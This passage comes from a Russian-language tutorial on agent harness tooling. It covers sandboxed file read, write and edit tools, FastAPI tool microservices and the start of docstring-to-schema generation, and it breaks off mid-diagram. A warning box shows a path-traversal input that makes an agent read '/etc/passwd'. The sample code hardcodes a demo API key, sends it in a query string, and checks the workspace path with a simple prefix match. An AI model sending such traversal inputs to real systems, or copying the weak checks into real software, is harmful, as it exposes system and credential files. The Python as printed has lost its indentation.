Файловая система решает эту проблему. В статье *The Anatomy of an Agent Harness* прямо сказано: «Мы хотим, чтобы агенты имели надежное хранилище (durable storage) для взаимодействия с реальными данными, выгрузки информации, которая не помещается в контекст, и сохранения работы между сессиями».

#### 2. Паттерн "Filesystem Offload" (Разгрузка контекста)
Даже с контекстом в 128K или 200K токенов, загрузка сырых данных (например, логов ошибок или огромных датасетов) напрямую в системный промпт - это катастрофа для юнит-экономики и качества рассуждений. *Context Management for Deep Agents* описывает ключевую технику сжатия: «Offloading large tool results: Мы выгружаем большие ответы инструментов в файловую систему, когда они возникают». 
В Фазе 3 нашего роадмапа это правило формализовано в виде жесткого архитектурного стандарта: «Filesystem offload: любой результат инструмента >20K токенов пишется в `./workspace/<id>.txt`, в контексте остается путь и preview из 10 строк».

#### 3. Безопасность, Guardrails и Изоляция (Sandboxing)
Давать LLM инструмент типа `bash` или неограниченный `write_file` в корневую директорию системы - это рецепт катастрофы. Роадмап (Фаза 5) требует внедрения песочниц и хуков: «Все code execution – в песочнице... Хуки как guardrails: PreToolUse-хуки, блокирующие деструктивный Bash, regex-блок секретов, валидация путей записи».
Более того, при проектировании файловых инструментов необходимо следовать принципам бережливого отношения к данным. Как гласят корпоративные инструкции Claude: «Никогда не удалять оригинальный файл без предварительного создания резервной копии». Ваши инструменты должны программно (на уровне Python) создавать бэкапы перед вызовом операций перезаписи.

#### 4. Проблема идемпотентности и чистой сессии
В *Лекции 12. Каждая сессия должна оставлять чистое состояние* описано, как агенты-новички засоряют файловую систему: «следующая сессия агента стартует и сразу обнаруживает: сборка сломана, тесты красные, повсюду временные дебаг-файлы... Новая сессия тратит первые 30 минут просто на выяснение "что вообще делала прошлая сессия"». Инструменты работы с файловой системой должны быть атомарными и идемпотентными (безопасными для повторных вызовов).

---

### Архитектурная схема ASCII: Безопасный слой файловых операций

Следующий направленный ациклический граф (DAG) иллюстрирует архитектуру наших файловых инструментов с внедренной проверкой путей (Path Traversal Protection) и паттерном создания резервных копий перед мутациями.

```ascii
=============================================================================================
 ENTERPRISE FILESYSTEM TOOL DISPATCH HARNESS
=============================================================================================

[ 1. ReAct ORCHESTRATOR ]
Thought: "I need to fix the bug in data_processor.py."
Action: `{"name": "os_edit_file", "arguments": {"filepath": "../data_processor.py",...}}`
 |
 v
+-----------------------------------------------------------------------------------------+
| 2. TOOL REGISTRY & PRE-TOOL HOOKS (Security Layer) |
| - Validates target filepath against `WORKSPACE_DIR` bounds. |
| - INTERCEPTS `../` (Path Traversal Attempt). |
| - Resolves absolute path safely. |
+-----------------------------------------------------------------------------------------+
 |
 v
+-----------------------------------------------------------------------------------------+
| 3. FILESYSTEM EXECUTION ENGINE (Python OS Module) |
| |
| [ Read Operation ] [ Write / Edit Operation ] |
| - Checks file size. - Checks if file exists. |
| - Reads chunked data. - Creates backup (e.g. `file.py.bak`). |
| - Executes string replacement or atomic write. |
+-----------------------------------------------------------------------------------------+
 | |
 v v
[ 4A. OBSERVATION (Success) ] [ 4B. OBSERVATION (Error / Guardrail) ]
- "File successfully updated." - "SECURITY ERROR: Path outside workspace."
- "Backup created at.bak" - "ERROR: File size exceeds 5MB limit. 
- (Returned to LLM context) Use semantic_grep instead of read_file."
=============================================================================================
```

---

### Подробное практическое руководство и продакшн-код

Мы разработаем три критически важных инструмента: `read_file`, `write_file` и `edit_file`. Мы внедрим строгую песочницу на уровне приложения (Application-Level Sandboxing), гарантируя, что агент не сможет выйти за пределы директории `./workspace`.

#### Шаг 1: Настройка среды и базовый инструмент чтения (`read_file`)
Чтение файлов должно быть защищено от переполнения контекстного окна LLM. Если агент попытается прочитать видеофайл или лог на 10 ГБ, скрипт не должен падать с ошибкой нехватки памяти (OOM), а должен корректно отказать в операции.

```python
import os
import shutil
import logging
from typing import Dict, Any
from pathlib import Path

# Подключаем наш ToolRegistry из Блока 1 (Неделя 11)
from agent_harness import registry

logging.basicConfig(level=logging.INFO, format='%(asctime)s - [FS_HARNESS] - %(message)s')

# Определение жестких границ песочницы
WORKSPACE_DIR = Path(os.path.abspath("./workspace"))
os.makedirs(WORKSPACE_DIR, exist_ok=True)
MAX_FILE_SIZE_BYTES = 50 * 1024 # 50 KB лимит для чтения в контекст LLM

def _secure_resolve_path(relative_path: str) -> Path:
 """
 Критический PreToolUse Hook: защищает от уязвимости Path Traversal (LFI).
 Убеждается, что итоговый путь находится СТРОГО внутри WORKSPACE_DIR.
 """
 target_path = Path(os.path.join(WORKSPACE_DIR, relative_path)).resolve()
 
 # Проверка: начинается ли итоговый путь с пути к workspace?
 if not str(target_path).startswith(str(WORKSPACE_DIR)):
 raise PermissionError(f"SECURITY VIOLATION: Attempted path traversal to '{target_path}'. Access Denied.")
 
 return target_path

@registry.register(namespace="os")
def read_file(filepath: str, context: Dict[str, Any] = None) -> str:
 """
 Reads the full content of a file from the workspace.
 Use this tool to inspect existing code, read research logs, or analyze data.:param filepath: The relative path to the file (e.g., 'src/main.py' or 'data.csv').
 """
 logging.info(f"Agent requested to read: {filepath}")
 
 try:
 secure_path = _secure_resolve_path(filepath)
 
 if not secure_path.exists() or not secure_path.is_file():
 return f"Error: File '{filepath}' does not exist or is a directory."
 
 # Защита контекста от переполнения (Filesystem Offload / Compression)
 if secure_path.stat().st_size > MAX_FILE_SIZE_BYTES:
 return (f"Error: File '{filepath}' is too large ({secure_path.stat().st_size} bytes). "
 f"Maximum allowed size for read_file is {MAX_FILE_SIZE_BYTES} bytes. "
 f"Please use a semantic search tool or chunk-based reader instead.")
 
 with open(secure_path, "r", encoding="utf-8") as file:
 content = file.read()
 
 return f"--- FILE CONTENT: {filepath} ---\n{content}\n--- END OF FILE ---"

 except PermissionError as pe:
 logging.critical(str(pe))
 return str(pe)
 except UnicodeDecodeError:
 return f"Error: File '{filepath}' appears to be a binary file. Cannot read as text."
 except Exception as e:
 return f"System Error during file read: {str(e)}"
```

#### Шаг 2: Безопасное создание и перезапись файлов (`write_file`)
Создание файлов - это основа автономии. Именно так агенты пишут новый код или сохраняют результаты поискового ресёрча (Filesystem Offload). Мы реализуем атомарную запись и создание директорий на лету.

```python
@registry.register(namespace="os")
def write_file(filepath: str, content: str, context: Dict[str, Any] = None) -> str:
 """
 Creates a new file or OVERWRITES an existing file completely.
 WARNING: This replaces all existing content. If you want to modify a file, use edit_file.:param filepath: The relative path where the file should be saved.:param content: The full string content to write into the file.
 """
 logging.info(f"Agent requested to write to: {filepath}")
 
 try:
 secure_path = _secure_resolve_path(filepath)
 
 # Создаем вложенные папки, если они не существуют (например, src/utils/helper.py)
 secure_path.parent.mkdir(parents=True, exist_ok=True)
 
 # Корпоративное требование безопасности: Создание бэкапа перед деструктивным действием
 backup_msg = ""
 if secure_path.exists():
 backup_path = secure_path.with_suffix(secure_path.suffix + ".bak")
 shutil.copy2(secure_path, backup_path)
 backup_msg = f" (Original backed up to '{backup_path.name}')"
 
 with open(secure_path, "w", encoding="utf-8") as file:
 file.write(content)
 
 return f"Success: File '{filepath}' has been successfully written{backup_msg}."

 except PermissionError as pe:
 return str(pe)
 except Exception as e:
 return f"System Error during file write: {str(e)}"
```

#### Шаг 3: Точечное редактирование (`edit_file`)
Самая большая проблема ИИ-агентов при написании кода - они ленивы. Если попросить агента исправить одну строчку в файле на 500 строк, используя `write_file`, он часто пишет: `// остальной код пропущен...`, что безвозвратно уничтожает проект. Инструмент `edit_file` (основанный на поиске и замене) заставляет агента быть точным и предотвращает деградацию файлов.

```python
@registry.register(namespace="os")
def edit_file(filepath: str, search_string: str, replace_string: str, context: Dict[str, Any] = None) -> str:
 """
 Safely edits an existing file by finding an exact string match and replacing it.
 This is highly recommended for modifying code without rewriting the entire file.:param filepath: The relative path to the target file.:param search_string: The EXACT string currently in the file that needs replacing.:param replace_string: The new string to insert in its place.
 """
 logging.info(f"Agent executing targeted edit in: {filepath}")
 
 try:
 secure_path = _secure_resolve_path(filepath)
 
 if not secure_path.exists() or not secure_path.is_file():
 return f"Error: Cannot edit '{filepath}'. File does not exist."
 
 with open(secure_path, "r", encoding="utf-8") as file:
 content = file.read()
 
 # Строгая валидация: строка должна существовать и быть уникальной
 occurrences = content.count(search_string)
 if occurrences == 0:
 return (f"Error: The exact search_string was not found in the file. "
 f"Please use read_file to check the exact formatting/indentation, then try again.")
 elif occurrences > 1:
 return (f"Error: The search_string was found {occurrences} times. "
 f"Your search_string must be unique to avoid modifying the wrong section. Include more context lines.")
 
 # Создаем бэкап
 backup_path = secure_path.with_suffix(secure_path.suffix + ".bak")
 shutil.copy2(secure_path, backup_path)
 
 # Применяем замену
 new_content = content.replace(search_string, replace_string)
 
 with open(secure_path, "w", encoding="utf-8") as file:
 file.write(new_content)
 
 return f"Success: Exact string replacement executed in '{filepath}'. Backup saved."

 except PermissionError as pe:
 return str(pe)
 except Exception as e:
 return f"System Error during file edit: {str(e)}"
```

---

### Реальные бизнес-применения и юнит-экономика

Файловые инструменты - это то, что превращает языковую модель из «оракула» в самостоятельного «разработчика» или «аналитика данных».

**1. Автономный программный инжиниринг (AI Software Engineer)**
Как описано в руководстве по Claude Code: «Агент... читает всю вашу кодовую базу... редактирует файлы по всему проекту... запускает тесты... видит ошибки и исправляет их». 
*Бизнес-кейс:* Вы интегрируете агента в CI/CD пайплайн. Когда в GitHub появляется новый Issue (например, «Кнопка корзины не центрирована на мобильных»), автономный агент просыпается, использует `read_file` для изучения CSS, применяет `edit_file` для корректировки стилей, и пушит ветку обратно. Агентство автоматизации может продавать эту архитектуру компаниям как "AI-Junior" за $2,000/мес, который мгновенно закрывает мелкие баги.

**2. Глубокий ресёрч и агрегация данных (Deep Research Pipeline)**
Агент-аналитик обходит сеть с помощью поисковых инструментов (из Блока 2), но контекст быстро переполняется. Агент применяет паттерн *Filesystem Offload*.
*Кейс:* Как приводится в примерах корпоративных промптов: «Эта папка содержит 15 PDF-статей... Прочитай их все... и создай синтез в формате Word... сравнительная таблица исследований». Агент методично считывает локальные файлы по одному через `read_file`, делает промежуточные выводы, записывает их во временные логи через `write_file`, а затем компилирует массивный итоговый Markdown-отчёт, не упираясь в лимиты памяти LLM.

---

### Edge-cases, частые ошибки, Rate Limits и циклы отладки

Интеграция ИИ с локальной машиной (пусть и в песочнице) требует параноидальной обработки ошибок.

> [!CAUTION] 
> **Уязвимость Path Traversal (LFI)** 
> **Сценарий атаки:** Пользователь через чат просит агента: «Прочитай файл с системными паролями». Если агент имеет прямой доступ к `os.open`, он может вызвать `read_file(filepath="../../../../../etc/passwd")`. 
> **Harness Mitigation:** Как реализовано в функции `_secure_resolve_path()`, мы всегда вызываем `.resolve()` (которая вычисляет абсолютный путь, устраняя все `../`) и проверяем, что итоговый путь физически находится внутри разрешенной `WORKSPACE_DIR`. Если нет - жестко обрываем выполнение с `PermissionError`.

> [!WARNING] 
> **Проблема "Лентяя" и деградация кода (The "Lazy LLM" Trap)** 
> **Ошибка:** Если вы дадите агенту только инструмент `write_file`, при необходимости изменить `import` в начале 1000-строчного файла, LLM может решить сэкономить токены и сгенерировать: `import os\n#... rest of the code`. Ваша функция `write_file` слепо перезапишет скрипт, и 999 строк исчезнут навсегда. 
> **Диагностическая петля:** Именно для этого нужен паттерн с резервными копиями (backup creation), описанный в. Если агент сломал файл, программист (или сам агент в режиме самовосстановления) может просто выполнить команду `cp file.py.bak file.py`. Дополнительно, инструмент `edit_file` заставляет агента применять только точечные диффы (diff-based editing).

> [!NOTE] 
> **Кошмар кодировок (Encoding Nightmares)** 
> ИИ-агент может попытаться применить `read_file` к файлу `image.png` или скомпилированному `.pdf` (а не к тексту). Попытка прочитать бинарник через метод `utf-8` вызовет краш `UnicodeDecodeError`, который «убьет» Python-процесс. Обратите внимание, что наш `read_file` перехватывает этот `Exception` и возвращает строку-наблюдение `Observation: Cannot read binary file`, позволяя агенту понять свою ошибку и продолжить работу, сохраняя **целостность сессии**.

Освоив эти файловые инструменты, вы наделили своего ReAct-агента способностью менять состояние мира. Ваш агент теперь имеет надёжное хранилище, умеет разгружать свой контекст и модифицировать кодовую базу как настоящий инженер-программист, полностью соответствуя принципу «Репозиторий как единый источник правды».

Готовы ли вы перейти к Блоку 4, где мы соберём все эти инструменты вместе внутри главного `while`-цикла (The ReAct Core Loop), создав полноценный автономный мозг нашего ИИ?

---

## Блок 4: Инструменты как REST API — обертка локальных Python-инструментов в эндпоинты FastAPI.

Добро пожаловать в четвёртый блок одиннадцатой недели. На данный момент мы построили монолитного ReAct-агента: наш реестр инструментов, поисковые функции и операции с файловой системой живут в одном процессе памяти. Для прототипов и локальных экспериментов монолитная архитектура - это нормально. Однако, когда мы переходим к Enterprise-решениям, такая тесная связь становится фатальной уязвимостью. 

Что если ваш Python-инструмент требует тяжелых зависимостей (например, TensorFlow или Playwright), которые конфликтуют с легковесным окружением агента? Что если инструмент должен выполняться на защищенном сервере внутри корпоративной сети (on-premise), а агент крутится в публичном облаке? Как строго указывает *Фаза 5 роадмапа AI-инженера*, «Все code execution – в песочнице... Никогда не делайте exec() выхода модели в основном процессе».

В этом исчерпывающем, монументальном глубоком погружении мы освоим паттерн **Decoupling (Отвязка)**. Мы научимся извлекать наши Python-инструменты из локального скрипта и оборачивать их в полноценные микросервисы на базе **FastAPI**. Мы превратим любую Python-функцию в REST API эндпоинт, к которому наш агент (или любая no-code платформа вроде n8n) сможет обращаться по сети. Эта архитектура не только обеспечивает изоляцию секретов и песочницу для выполнения кода, но и открывает путь к масштабируемым многоагентным системам.

---

### Глубокий теоретический анализ: Переход от монолита к API-центричной обвязке

Разделение «мозга» (агента) и «рук» (инструментов) - это архитектурный Рубикон, который должен перейти каждый Senior AI Architect.

#### 1. Изоляция контекста и песочницы (Sandboxing)
Монолитная архитектура опасна. Если функция `write_file` выполняется в том же процессе, что и сам оркестратор агента, любая уязвимость или галлюцинация модели может привести к крашу всего Python-приложения. Оборачивая инструменты в REST API, мы создаем строгую сетевую границу (Network Boundary). Агент отправляет JSON-запрос (HTTP POST ) на сервер FastAPI. Сервер FastAPI может работать в изолированном Docker-контейнере (песочнице) с минимальными правами доступа. Если инструмент падает, он возвращает HTTP 500, но сам агент остается жив и может обработать ошибку.

#### 2. Брокинг секретов на стороне сервера
В лекциях по Harness Engineering и *роадмапе* подчеркивается: «Auth и брокинг секретов. Учетки никогда не попадают в контекст (паттерн Anthropic Managed Agents)». Если инструмент обращается к корпоративной базе данных PostgreSQL, логин и пароль от БД должны храниться в `.env` файле на сервере FastAPI, а не на сервере, где крутится LLM-агент. Агент знает только URL эндпоинта. Это концепция Zero-Trust в агентной архитектуре.

#### 3. Наблюдаемость (Observability) и логирование
Как гласит *Лекция 11. Сделайте рантайм агента наблюдаемым*: «Без наблюдаемости агенты принимают решения в условиях неопределённости... ретраи превращаются в слепое блуждание». REST API стандартизирует наблюдаемость. Когда инструмент является эндпоинтом FastAPI, вы получаете бесплатное логирование каждого HTTP-запроса, мониторинг времени отклика (latency) и статусов ответов (200 OK, 422 Unprocessable Entity, 500 Internal Server Error) на уровне веб-сервера (например, через Nginx или внутренние логи FastAPI).

#### 4. Интеграция с No-Code (n8n)
Создав инструмент как REST API, вы делаете его универсальным. В статьях на Хабре часто обсуждается проблема ограниченности готовых нод: «придется как-то через “костыли” придумывать http-request ноду, поднимать через FastAPI сервис и прочее». Более того, статья «Пишем свою ноду в n8n под любой API за вечер» доказывает, что лучший способ расширить n8n - это поднять свой API. Ваш агент в Python и ваш рабочий процесс в n8n смогут одновременно использовать один и тот же микросервис FastAPI. Как сказано в *карта развития ИИ-Инженера*: «Каждая автоматизация, которую вы когда-либо построите, соединяет две системы через API».

---

### Архитектурная схема ASCII: Decoupled REST Tool Dispatch

Следующий направленный ациклический граф (DAG) иллюстрирует, как наш локальный ReAct-цикл теперь обращается к инструментам через сетевой протокол HTTP, обеспечивая полную изоляцию исполнения.

```ascii
=============================================================================================
 ENTERPRISE DECOUPLED TOOL HARNESS (FASTAPI)
=============================================================================================

[ 1. ReAct ORCHESTRATOR AGENT (Client Machine) ]
Thought: "I need to fetch proprietary customer data from the legacy ERP."
Action: {"name": "api_fetch_customer", "arguments": {"customer_id": 992}}
 |
 v
+-----------------------------------------------------------------------------------------+
| 2. TOOL REGISTRY (HTTP Dispatcher) |
| - Maps `api_fetch_customer` to -> `POST https://api.internal.com/v1/customer` |
| - Packages arguments into JSON payload. |
| - Injects 'Authorization: Bearer <token>' header for API Gateway. |
+-----------------------------------------------------------------------------------------+
 | (Network Boundary)
 v
+-----------------------------------------------------------------------------------------+
| 3. FASTAPI MICROSERVICE (Isolated Docker Container / Sandbox) |
| - Receives HTTP POST. |
| - Validates incoming JSON strictly using Pydantic Models (HTTP 422 if invalid). |
| - Executes complex/heavy Python logic (e.g., SQLAlchemy / Legacy ERP drivers). |
| - Returns JSON Response (HTTP 200). |
+-----------------------------------------------------------------------------------------+
 |
 / (HTTP 200 OK) | \ (HTTP 422 / 500 Errors)
 v v
[ 4A. PARSE & RETURN ] [ 4B. DIAGNOSTIC LOOP (Self-Healing) ]
- Extract `"data"` from JSON. - Catch `requests.exceptions.HTTPError`.
- Return clean string to LLM. - Return EXACT error message to LLM context:
 "HTTP 422: customer_id must be an integer."
=============================================================================================
```

---

### Подробное практическое руководство и продакшн-код

Мы разделим этот процесс на две части. Сначала мы напишем и запустим микросервис FastAPI (наши "руки"), а затем напишем инструмент-клиент для нашего `ToolRegistry` (наш "мозг"), который будет к нему обращаться.

#### Шаг 1: Создание микросервиса FastAPI (Серверная часть)
Представим, что у нас есть тяжелый скрипт анализа данных компании, который требует 8 ГБ оперативной памяти и библиотеки `pandas`. Мы не хотим тянуть `pandas` в окружение агента. Мы выносим его в FastAPI.

Создайте файл `tool_server.py`:

```python
import logging
from fastapi import FastAPI, HTTPException, Depends
from pydantic import BaseModel, Field
import uvicorn

# Настройка логирования сервера
logging.basicConfig(level=logging.INFO, format='%(asctime)s - [FASTAPI_TOOL] - %(message)s')

app = FastAPI(title="Agentic Tools API", version="1.0.0")

# 1. Pydantic-схемы определяют строгий контракт данных. 
# Это гарантирует, что если LLM галлюцинирует типы данных, FastAPI сразу отклонит запрос.
class CustomerQueryRequest(BaseModel):
 customer_id: int = Field(..., description="The unique integer ID of the customer.")
 include_history: bool = Field(default=False, description="Whether to include purchase history.")

class CustomerResponse(BaseModel):
 status: str
 customer_name: str
 lifetime_value: float
 data: dict

# 2. Имитация функции безопасности (Zero-Trust)
def verify_api_key(api_key: str):
 if api_key!= "super_secret_internal_key_123":
 raise HTTPException(status_code=401, detail="Unauthorized Agent Access")

# 3. Эндпоинт, который выполняет реальную работу
@app.post("/tools/customer-analysis", response_model=CustomerResponse)
async def analyze_customer(request: CustomerQueryRequest, token: str = ""):
 """
 Эндпоинт, оборачивающий сложную внутреннюю бизнес-логику.
 """
 verify_api_key(token)
 logging.info(f"Processing customer {request.customer_id}. History requested: {request.include_history}")
 
 # Имитация тяжелого запроса к БД или работы pandas
 if request.customer_id < 0:
 # Возвращаем понятную бизнес-ошибку (HTTP 400 Bad Request)
 raise HTTPException(status_code=400, detail="customer_id cannot be negative.")
 
 # Имитация успешного ответа
 result = {
 "status": "success",
 "customer_name": f"Enterprise Corp {request.customer_id}",
 "lifetime_value": 45000.50,
 "data": {"last_purchase": "2026-05-18", "active_tickets": 2} if request.include_history else {}
 }
 return result

if __name__ == "__main__":
 # Запуск изолированного сервера на порту 8000
 # В продакшене это запускается через `uvicorn tool_server:app --host 0.0.0.0 --port 8000`
 uvicorn.run(app, host="127.0.0.1", port=8000)
```

#### Шаг 2: Интеграция REST-инструмента в ReAct Агента (Клиентская часть)
Теперь мы вернемся в наш `ToolRegistry` (из Блока 1). Мы напишем инструмент, который просто делает `requests.post()` к нашему FastAPI. Это классический паттерн тонкого клиента.

```python
import requests
import json
from typing import Dict, Any
import logging

# Подключаем наш ToolRegistry из Блока 1
from agent_harness import registry

logging.basicConfig(level=logging.INFO, format='%(asctime)s - [AGENT_CLIENT] - %(message)s')

FASTAPI_BASE_URL = "http://127.0.0.1:8000"
INTERNAL_API_KEY = "super_secret_internal_key_123" # В проде берется из os.environ

@registry.register(namespace="erp")
def get_customer_analysis(customer_id: int, include_history: bool = False) -> str:
 """
 Fetches deep financial and operational analysis for a specific customer from the ERP system.
 
 Use this tool when you need to know a customer's lifetime value or past tickets.:param customer_id: The exact integer ID of the customer.:param include_history: Set to True to retrieve purchase history and active tickets.
 """
 logging.info(f"Agent requested ERP data for Customer {customer_id}")
 
 url = f"{FASTAPI_BASE_URL}/tools/customer-analysis"
 payload = {
 "customer_id": customer_id,
 "include_history": include_history
 }
 
 try:
 # Передача ключа в параметрах (или заголовках)
 response = requests.post(url, json=payload, params={"token": INTERNAL_API_KEY}, timeout=10.0)
 
 # Если FastAPI вернул ошибку валидации (422) или бизнес-ошибку (400), 
 # мы перехватываем её и возвращаем АГЕНТУ как текст для самовосстановления!
 if response.status_code!= 200:
 error_data = response.json()
 diagnostic_msg = f"HTTP {response.status_code} Error from Tool: {json.dumps(error_data)}. Please fix your parameters and try again."
 logging.warning(diagnostic_msg)
 return diagnostic_msg
 
 # Успешный ответ
 data = response.json()
 
 # Filesystem Offload / Context Compaction паттерн
 # Превращаем JSON в компактную строку для экономии токенов LLM
 observation = (
 f"Customer Name: {data['customer_name']}\n"
 f"LTV: ${data['lifetime_value']}\n"
 f"Extra Data: {json.dumps(data['data']) if data['data'] else 'None'}"
 )
 return observation

 except requests.exceptions.RequestException as e:
 # Сетевые сбои (FastAPI сервер лежит)
 critical_error = f"CRITICAL: The internal ERP tool server is currently unreachable. Error: {str(e)}"
 logging.error(critical_error)
 return critical_error
```

---

### Реальные бизнес-применения и юнит-экономика

Обертка инструментов в REST API - это фундамент масштабируемых ИИ-предприятий.

**1. Создание кастомных нод для n8n (Agency Automation)**
Как подробно описывается в статьях Хабра «Пишем свою ноду в n8n под любой API за вечер» и «Расширяем базовый функционал n8n: от RAG до кастомного агента с MCP» [6, 10-17], вы часто будете упираться в лимиты готовых интеграций n8n. Если клиенту нужно, чтобы ИИ-агент (живущий в n8n) рассчитал сложную логистическую формулу или обратился к самописной 1С, вы не пишете этот код внутри n8n. Вы пишете микросервис на FastAPI, деплоите его на Railway или Amvera, а затем используете узел `HTTP Request` в n8n (или MCP-сервер), чтобы отправить JSON-запрос к вашему FastAPI. Это позволяет продавать сложные технические решения B2B-клиентам с чеком от $2,500+, сохраняя стабильность системы.

**2. Многоагентные системы (Multi-Agent Swarms)**
В крупных организациях (например, в паттернах *Orchestrator-Worker* ) могут одновременно работать 50 различных субагентов. Если каждый агент будет поднимать свою локальную копию браузера Playwright для веб-скрейпинга, ваш сервер мгновенно упадет от нехватки памяти (OOM). Обернув скрипт Playwright в эндпоинт FastAPI, вы централизуете ресурс. 50 легковесных LLM-агентов просто шлют HTTP-запросы к единому, балансируемому API-шлюзу скрейпера. Это кардинально снижает затраты на вычислительную инфраструктуру.

---

### Edge-cases, частые ошибки, Rate Limits и циклы отладки

Сетевая граница защищает от крашей кода, но вводит новые, чисто сетевые классы ошибок.

> [!CAUTION] 
> **Иллюзия успешного выполнения (The HTTP 200 Trap)** 
> **Ошибка:** Разработчик ловит все ошибки внутри FastAPI через `try/except` и всегда возвращает `{"status": "error", "message": "..."}` с кодом `HTTP 200 OK`. Агент вызывает инструмент, получает статус 200, парсит слово `error`, путается и считает, что инструмент отработал успешно, продолжая генерацию с неверными данными. 
> **Harness Mitigation:** Ваш FastAPI **обязан** использовать правильные HTTP-коды. Если данные агента невалидны - возвращайте `HTTP 422 Unprocessable Entity`. Если нет ключа - `HTTP 401`. В клиенте агента (`agent_client.py`) мы используем проверку `if response.status_code!= 200:`, чтобы жестко заблокировать некорректный ответ и заставить агента прочитать *Diagnostic Loop* (петлю самовосстановления).

> [!WARNING] 
> **Ошибки таймаутов (FastAPI TimeoutError)** 
> **Проблема:** Если ваш инструмент FastAPI выполняет тяжелую генерацию (например, рендер видео на 2 минуты), а клиент агента `requests.post(..., timeout=10.0)` ждет только 10 секунд, клиент выбросит `TimeoutError`. Агент получит сообщение об ошибке, хотя сервер всё ещё трудится над задачей. 
> **Диагностическая петля:** Для инструментов дольше 30 секунд REST API использовать нельзя. Нужно переходить на **Асинхронные Webhooks** (как упоминается в *карта развития ИИ-Инженера* ). Агент делает запрос на старт задачи (`HTTP 202 Accepted`), FastAPI возвращает `job_id`, а затем агент использует другой инструмент `check_job_status(job_id)` в цикле `while`, пока статус не изменится на `completed`.

> [!NOTE] 
> **Rate Limiting на стороне FastAPI** 
> Если ваш агент попадает в бесконечный цикл галлюцинаций (Doom Loop) и начинает бомбардировать ваш внутренний FastAPI-инструмент со скоростью 100 запросов в секунду, он сожжет базу данных. Всегда добавляйте Rate Limiting middleware прямо в FastAPI (например, `slowapi`), чтобы ограничивать вызовы от агента, заставляя обвязку агента применить декоратор `@retry_with_backoff` и "уснуть".

Отделив инструменты от мозга агента через FastAPI, мы достигли стандартов Enterprise-архитектуры. Наши скрипты стали безопасными микросервисами, которые могут масштабироваться независимо от языковой модели.

Готовы ли вы перейти к Блоку 5, где мы перейдем от создания отдельных инструментов к архитектуре мультиагентных систем и иерархической маршрутизации задач?

---

## Блок 5: Динамические схемы — автоматическое построение JSON-схем инструментов из docstring.

Добро пожаловать в пятый блок одиннадцатой недели. В предыдущих главах мы заложили архитектурный фундамент нашего ReAct-агента, реализовав микросервисы на FastAPI, файловые инструменты и подключение к поисковым API. Однако, любой агент - это просто `while true` цикл, который берет ваш ввод и «продолжает» его с помощью LLM, вызывая инструменты и возвращая результаты обратно в контекст. 

Чтобы языковая модель поняла, *какие* инструменты ей доступны и *как* именно их вызывать, ей нужен строгий контракт - JSON-схема (JSON Schema). Жесткое хардкодирование огромных JSON-словарей для каждого инструмента - это путь к техническому долгу, рассинхронизации документации и кода, а также к катастрофическим галлюцинациям агента.

Как строго предписывает Фаза 3 роадмапа AI-инженера, для перехода к production-архитектуре вам необходимо реализовать: «Реестр инструментов через декоратор Python ( `@tool` ) с автогенерацией JSON-schema». 

В этом исчерпывающем, монументальном глубоком погружении мы навсегда избавимся от ручного написания JSON. Мы спроектируем систему динамической рефлексии (Reflection) на Python, которая будет на лету читать сигнатуры ваших функций (Type Hints) и их документацию (Docstrings), автоматически транслируя детерминированный код в вероятностные инструкции для LLM. Это и есть высший пилотаж Agent-Computer Interface (ACI).

---

### Глубокий теоретический анализ: Физика Agent-Computer Interface (ACI)

Прежде чем писать код генератора схем, архитектор должен понять, как языковая модель «видит» ваш инструмент. LLM не умеет читать исходный код функции. Единственное, на что она опирается при принятии решения - это сгенерированная вами JSON-схема.

#### 1. Проблема синхронизации и Instruction Bloat
В классической разработке, если вы меняете тип аргумента с `integer` на `string`, вам нужно обновить документацию. Если вы забудете это сделать, программа упадет. В разработке агентов ставки еще выше. Если ваша Python-функция требует `user_id: int`, а захардкоженная JSON-схема всё ещё говорит LLM передавать `string`, возникает фатальный сбой, который OpenAI и Anthropic называют *Capability Gap* и *Verification Gap*. Автоматическая генерация схем из сигнатуры функции гарантирует принцип «Репозиторий как единый источник правды». Ваш код и есть ваша спецификация.

#### 2. Docstring как промпт (Prompting via ACI)
В разработке обычного ПО docstring - это просто подсказка для программиста в IDE. В инженерии обвязок (Harness Engineering) docstring - это системный промпт для LLM. Как указывается в руководстве по созданию агентов, «Пишите описания инструментов так, чтобы их невозможно было неправильно интерпретировать». 
Документация Anthropic по Managed Agents уточняет: «Подробные описания - самый важный фактор. 3–4 предложения на инструмент: что делает, когда использовать, ограничения». Наша динамическая система должна уметь парсить эти 3-4 предложения и инжектировать их прямо в поле `description` JSON-схемы. Без этого агент начнет использовать инструменты не по назначению.

#### 3. Семантическая маршрутизация и Progressive Disclosure
Современные агенты могут иметь доступ к сотням инструментов. Однако загрузка 100 JSON-схем в системный промпт вызовет переполнение контекста (Context Bloat) и приведет к тому, что модель запутается в приоритетах (эффект *Lost in the Middle*). Динамическая генерация схем позволяет реализовать паттерн *Progressive Disclosure* (постепенное раскрытие). Обвязка может динамически сгенерировать и подгрузить только те JSON-схемы, которые релевантны текущему шагу агента, экономя токены и фокусируя внимание модели.

#### 4. Type Hinting как контракт (Pydantic & JSON Schema)
Основа структурированного вывода - это строгая типизация. В Python мы используем аннотации типов (Type Hints), такие как `def my_func(count: int, name: str)`. Наш генератор должен спуститься на уровень абстрактного синтаксического дерева (AST) модуля `inspect`, извлечь эти типы и транслировать их в стандарт спецификации OpenAPI/JSON Schema (`{"type": "integer"}`, `{"type": "string"}`).

---

### Архитектурная схема ASCII: Конвейер динамической генерации схем

Следующий направленный ациклический граф (DAG) демонстрирует, как Python-код во время инициализации обвязки (Runtime Initialization) превращается в готовую для LLM структуру.

```ascii
=============================================================================================
 ENTERPRISE DYNAMIC SCHEMA GENERATOR HARNESS
=============================================================================================

[ 1. DEVELOPER WORKSPACE (Python Code) ]
@tool(category="database")
def fetch_user_data(user_id: int, include_logs: bool = False) -> str:
 """
 Fetches raw user telemetry from the production PostgreSQL database.
 Use ONLY when the user asks for historical action logs.
 """
 | (Runtime Initialization)
 v
+-----------------------------------------------------------------------------------------+
| 2. REFLECTION & PARSING LAYER (`inspect` module) |
| -> Extracts Function Name: `fetch_user_data` |
| -> Parses Docstring: "Fetches raw user telemetry..." |
| -> Extracts Signature: `user_id` (Type: int, Required: Yes) |
| -> Extracts Signature: `include_logs` (Type: bool, Required: No, Default: False) |
+-----------------------------------------------------------------------------------------+
 |
 v
+-----------------------------------------------------------------------------------------+
| 3. JSON SCHEMA TRANSLATOR (Type Mapping) |
| -> Maps `int` to JSON Schema `{"type": "integer"}` |
| -> Maps `bool` to JSON Schema `{"type": "boolean"}` |
| -> Constructs OpenAPI/Anthropic compliant payload. |
+-----------------------------------------------------------------------------------------+
 |
 v
